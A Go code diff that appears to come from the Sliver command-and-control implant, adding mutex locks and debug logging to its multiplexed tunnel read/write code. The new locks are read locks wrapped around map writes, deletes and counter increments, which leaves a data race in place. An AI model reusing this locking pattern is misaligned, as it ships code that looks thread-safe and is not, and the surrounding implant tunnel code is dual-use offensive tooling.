@@ -92,6 +92,7 @@ func (t *MuxTunnel) Read(data []byte) (n int, err error) {
 
 // Write - Implements net.Conn Write(), by sending data back to the server through the Session's RPC tunnels.
 func (t *MuxTunnel) Write(data []byte) (n int, err error) {
+	t.mutex.RLock() // Look as soon as now, we never know if the ToServerSequence might change before being written.
 	sdata, _ := proto.Marshal(&sliverpb.CommTunnelData{
 		Sequence: t.ToServerSequence,
 		TunnelID: t.ID,
@@ -100,8 +101,10 @@ func (t *MuxTunnel) Write(data []byte) (n int, err error) {
 	})
 	// {{if .Config.Debug}}
 	log.Printf("[tunnel] To server %d byte(s)", len(data))
+	log.Printf("[tunnel] Sequence: %d ", t.ToServerSequence)
 	// {{end}}
 	t.ToServerSequence++
+	t.mutex.RUnlock()
 	t.ToServer <- &sliverpb.Envelope{
 		Type: sliverpb.MsgCommTunnelData,
 		Data: sdata,
@@ -174,7 +177,9 @@ func (t *MuxTunnel) handleFromServer() {
 		// {{if .Config.Debug}}
 		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", t.ID, data.Sequence)
 		// {{end}}
+		t.mutex.RLock()
 		t.cache[data.Sequence] = data
+		t.mutex.RUnlock()
 
 		// Go through cache and write all sequential data to the buffer
 		for recv, ok := t.cache[t.FromServerSequence]; ok; recv, ok = t.cache[t.FromServerSequence] {
@@ -186,12 +191,14 @@ func (t *MuxTunnel) handleFromServer() {
 				// {{end}}
 			}
 			// {{if .Config.Debug}}
-			log.Printf("[tunnel] Wrote %d bytes to SSH connection", len(recv.Data))
+			log.Printf("[tunnel] Wrote %d bytes to comm tunnel buffer", len(recv.Data))
 			// {{end}}
 
 			// Delete the entry we just wrote from the cache
+			t.mutex.RLock()
 			delete(t.cache, t.FromServerSequence)
 			t.FromServerSequence++ // Increment sequence counter
+			t.mutex.RUnlock()
 		}
 	}
 }
